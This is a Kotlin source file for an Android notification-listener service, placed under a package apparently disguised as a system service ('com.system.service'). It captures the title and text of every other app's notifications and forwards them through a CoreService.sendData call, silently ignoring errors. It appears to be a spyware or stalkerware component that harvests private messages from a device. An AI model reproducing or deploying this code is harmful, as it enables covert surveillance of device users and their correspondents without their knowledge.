package com.system.service.monitors

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.system.service.core.CoreService
import org.json.JSONObject

class NotificationMonitor : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        if (sbn.packageName == packageName) return

        try {
            val extras = sbn.notification.extras
            val title = extras.getString("android.title") ?: ""
            val text = extras.getCharSequence("android.text")
                ?.toString() ?: ""

            val appName = try {
                packageManager.getApplicationLabel(
                    packageManager.getApplicationInfo(sbn.packageName, 0)
                ).toString()
            } catch (e: Exception) { sbn.packageName }

            if (::CoreService.instance.isInitialized) {
                CoreService.instance.sendData("notification",
                    JSONObject().apply {
                        put("app", appName)
                        put("pkg", sbn.packageName)
                        put("title", title)
                        put("text", text)
                    })
            }
        } catch (e: Exception) { }
    }
}
